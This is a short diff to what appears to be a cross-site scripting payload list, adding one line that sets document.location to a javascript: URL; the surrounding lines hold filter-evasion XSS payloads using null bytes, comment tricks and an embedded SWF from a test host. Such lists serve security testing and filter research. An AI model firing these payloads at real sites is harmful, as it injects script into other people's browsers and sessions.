@@ -15,3 +15,4 @@ alert/**/(1)//
 ;<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script>
 ;</script><embed/test=''/allowscr%00iptaccess='always'/s%00rc='//test.test/xss2.swf'//>&id=9978655
 ,alert(0),
+,document.location='javascript:document.domain',
